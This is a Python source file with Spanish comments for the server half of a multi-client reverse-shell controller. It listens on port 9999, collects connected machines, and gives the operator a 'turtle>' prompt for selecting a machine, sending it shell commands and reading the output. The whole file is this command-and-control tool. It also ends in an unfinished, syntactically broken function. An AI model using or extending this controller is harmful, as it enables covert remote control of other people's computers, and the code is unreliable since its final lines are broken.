#socket permite a dos ordenadores tener una conversacion
#sys permite que python ejecute comandos del shell.

import socket
import threading
import sys
import time
from queue import Queue


NUMBER_OF_THREADS = 2
JOB_NUMBER = [1 , 2] #cada vez que cree un nuevo thread va a meter el siguiente objeto en la cola.
queue = Queue()
all_connections = []
all_addresses = []

# Salida general del programa 

def socket_create():
    try:
        global host #variable global que hara de host, cogera la IP del cliente
        global port #variable global que decide el puerto donde se hara la conexion
        global s
        host = '' 
        port = 9999 #este puerto no se utiliza para nada asi que no habra problemas
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
        

# Linkear socket al puerto y esperar la conexion del cliente

def socket_bind():
    try:
        global host
        global port
        global s
        print("Conectando socket")
        s.bind((host,port))
        s.listen(5) #Escucha para aceptar conexiones. El server espera hasta 5 malas conexiones antes de rechazar una conexion. Linea obligatoria.
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()

# Establecer la conexion con el cliente (Despues de escuchar)

#Aceptar conexiones de multiples clientes y guardar en una lista
#Limpia todas las conexiones y direcciones, despues empieza un bucle infinito en el que las acepta todas

def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while 1:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\nConexion establecida " + address[0])
        except:
            print("Error aceptando conexiones")

# Prompt interactivo para escribir comandos remotamente

def start_turtle():
    time.sleep(2)
    list_connections()
    time.sleep(1)
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)         
            if conn is not None:
                send_target_commands(conn)
        elif cmd == 'exit':
            print("Para salir, por favor, cierra la ventana")
        else:
            print("Command not recognized")

# Muestra todas las conexiones actuales

def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
    print('\n----- Clients -----' + '\n' + results)

# Seleccionar un dispositivo a controlar

def get_target(cmd):
    try:
        target = cmd.replace('select ', '')     # Vacia la variable cmd
        target = int(target)
        conn = all_connections[target]
        print("Conectado a " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print("No es una seleccion valida")
        return None

# Conectarse a un cliente remoto

def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480), "latin1")
                print(client_response, end="")
            if cmd == 'quit':
                break             
        except: 
            print("Conexion perdida")
            break
# Crear threads

def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True                 #Este thread morirá cuando el programa principal muera
        t.start()

# Hacer el siguiente trabajo en la cola (uno gestiona las conexiones y el otro envia comandos)

def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            time.sleep(2)
            start_turtle()
        queue.task_done()
    

    


# Cada objeto es un nuevo trabajo

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()

def kill_general():
    While 


create_workers()
create_jobs()




    
